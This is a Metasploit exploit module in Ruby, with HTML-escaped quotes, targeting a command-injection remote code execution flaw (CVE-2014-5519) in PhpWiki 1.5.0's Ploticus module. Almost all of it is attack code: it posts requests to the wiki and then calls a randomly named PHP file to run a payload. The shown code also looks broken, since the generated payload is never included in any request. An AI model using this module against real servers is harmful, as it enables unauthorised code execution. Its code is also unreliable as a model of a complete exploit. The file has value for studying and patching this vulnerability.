# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Phpwiki Ploticus Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        The Ploticus module in PhpWiki 1.5.0 allows remote attackers to execute arbitrary
        code via command injection.
      },
      &#039;Author&#039;         =>
        [
          &#039;Benjamin Harris&#039;,              # Discovery and POC
          &#039;us3r777 <us3r777[at]n0b0.so>&#039;  # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2014-5519&#039; ],
          [ &#039;OSVDB&#039;, &#039;110576&#039; ],
          [ &#039;EDB&#039;, &#039;34451&#039;],
          [ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2014/Aug/77&#039; ] # The day the vuln went public
        ],
      &#039;Payload&#039;         =>
        {
          &#039;BadChars&#039;   => "\x00",
        },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [ &#039;Generic (PHP Payload)&#039;, { &#039;Arch&#039; => ARCH_PHP, &#039;Platform&#039; => &#039;php&#039; } ],
          [ &#039;Linux x86&#039;, { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039; } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 11 2014&#039;))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The full URI path to phpwiki&#039;, &#039;/phpwiki&#039;]) ,
      ], self.class)
  end

  def exploit
    uri =  target_uri.path

    payload_name = "#{rand_text_alpha(8)}.php"
    php_payload = get_write_exec_payload(:unlink_self=>true)

    res = send_request_cgi({
      &#039;uri&#039;      => normalize_uri(uri + &#039;/index.php/HeIp&#039;),
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;vars_post&#039; =>
      {
        &#039;pagename&#039;      => &#039;HeIp&#039;,
        &#039;action&#039;        => &#039;edit&#039;
      }
    })

    if not res or res.code != 200
      fail_with(Failure::UnexpectedReply, "#{peer} - Upload failed")
    end

    upload_uri = normalize_uri(uri + "/" + payload_name)
    print_status("#{peer} - Executing payload #{payload_name}")
    send_request_raw({
      &#039;uri&#039;    => upload_uri,
      &#039;method&#039; => &#039;GET&#039;
    })
  end
end

